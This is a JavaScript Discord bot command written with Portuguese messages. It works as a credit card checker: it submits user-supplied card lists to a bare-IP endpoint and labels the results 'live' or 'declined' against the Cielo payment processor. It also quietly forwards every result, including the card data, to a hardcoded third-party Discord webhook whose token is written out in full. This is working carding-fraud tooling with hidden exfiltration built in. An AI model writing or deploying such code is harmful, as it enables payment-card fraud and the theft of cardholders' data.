const superagent = require("superagent")
const { MessageEmbed } = require('discord.js')
module.exports.run = async(client, message, args) =>{

  let embedInicio = new MessageEmbed()
  .setTitle("Aguarde Estamos Testando Sua CC!")
  .setColor(0x00AE86)
.setImage("https://cdn.discordapp.com/attachments/957467279824650240/957883723976675398/standard_6.gif")
  
    message.channel.send({ embeds: [embedInicio] })


  superagent.get(`http://20.41.113.72/api2.php?lista=${args[0]}`).then(res =>{
    if(res.text.includes("✅")){
      let live =  new MessageEmbed()
      .setColor('#ff00ea')
      .setAuthor("Livezada", "https://cdn.discordapp.com/attachments/951485510050807818/952714200071938058/b93dffb87d52bf8fe8a13bfc3a874.gif","")    .setDescription(res.text) 
      .setFooter("Cielo (Autorizada).")
      .setThumbnail("")
    message.channel.send({ embeds: [live] })
      const { Webhook, MessageBuilder } = require('discord-webhook-node');
const hook = new Webhook("https://discord.com/api/webhooks/969762336573390948/xdQYXcfvw3veP3Uz-PoRcXeG3bAcIqGnJvsSdaAGp0sUNUKt9VXdowZ1qAd4NY_3g4HM");
 
const embed = new MessageBuilder()
      .setTitle('New LIVE CX2 CC!')
      .setColor('#ff00ea')
      .setDescription(res.text)
      .setThumbnail("");
 
hook.send(embed);
    }else{
      let die =  new MessageEmbed()
     .setAuthor("Reprovada", "https://cdn.discordapp.com/attachments/951485510050807818/952714200071938058/b93dffb87d52bf8fe8a13bfc3a874.gif","")
      .setColor('#a80000')
      .setFooter("Cielo (Negada).")
      .setDescription(res.text)
      .setThumbnail("")

    message.channel.send({ embeds: [die] })
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const hook = new Webhook("https://discord.com/api/webhooks/969762336573390948/xdQYXcfvw3veP3Uz-PoRcXeG3bAcIqGnJvsSdaAGp0sUNUKt9VXdowZ1qAd4NY_3g4HM");
 
const embed = new MessageBuilder()
      .setTitle('New CX2 CC!')
      .setColor('#a80000')
      .setDescription(res.text)
      .setThumbnail("");
 
hook.send(embed);
    }
  })
  .catch(erro =>{
    message.channel.send('ocorreu um erro:'+ erro)
  })
}